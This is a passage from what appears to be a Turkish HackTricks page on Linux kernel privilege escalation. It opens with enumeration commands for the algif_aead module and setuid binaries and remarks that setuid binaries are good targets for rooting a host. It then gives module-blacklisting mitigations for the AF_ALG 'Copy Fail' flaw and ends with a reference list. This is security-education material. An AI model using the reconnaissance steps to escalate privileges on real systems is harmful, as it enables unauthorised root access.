lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Aşağıdaki yapılandırma değerleri, yüklenebilir bir arayüzü kernel’e yerleşik olarak derlenmiş bir arayüzden ayırır; crypto derleme kuralları `CONFIG_CRYPTO_USER_API_AEAD` değerini `algif_aead` ile eşleştirir.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` bir modül olarak yüklenebilir/kaldırılabilir
- `CONFIG_CRYPTO_USER_API_AEAD=y`: arayüz kernel’e yerleşik olarak derlenir
- setuid binary’ler iyi hedeflerdir; çünkü yalnızca page-cache’e yönelik bir yama, yerel bir foothold’u root yetkisine yükseltmek için yeterli olabilir

#### `algif_aead` yolu için attack-surface azaltma

Güvenlik açığı bulunan arayüz yüklenebilir bir modül tarafından sağlanıyorsa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Kernel'e derlenmişse, bazı açıklamalarda init yolunun şu şekilde engellendiği bildirildi:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Bu tür bir azaltım, diğer kernel LPE’ler için de akılda tutulmaya değer: exploitation belirli bir isteğe bağlı interface’e bağlıysa, bu interface’i devre dışı bırakmak veya blacklist’e eklemek, tam bir kernel upgrade’i mümkün olmadan önce bile exploit yolunu kesebilir.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – kullanıcı tarafından yazılabilir bir PaperCut dizinindeki root tarafından çalıştırılan script’in ele geçirilmesi](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) SSS](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 için Openwall oss-security açıklaması](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable düzeltmesi: crypto: algif_aead - Yerinde olmayan çalışma biçimine geri dön](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 güvenlik duyurusu](https://copy.fail/)
- [7] [Theori / Xint teknik incelemesi](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone deposu / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE varyantı DirtyClone’u (CVE-2026-43503) inceleme ve exploit etme](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux düzeltmesi: net: skb: `__pskb_copy_fclone()` içinde `SKBFL_SHARED_FRAG` değerini koru (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux’un önceki azaltımı: splice edilmiş UDP paketleri için `SKBFL_SHARED_FRAG` değerini ayarla (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian kılavuz sayfası](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel belgeleri](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Uygulamaları İlişkilendirmeleri](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info belirtimi](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry belirtimi](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Dili](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile dosyası](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache güvenlik açığı](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` belgeleri](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` belgeleri](https://git-scm.com/docs/git-ls-tree)
- [33] [Git yapılandırma belgeleri](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator belgeleri](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: kalıcılık mekanizmaları](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
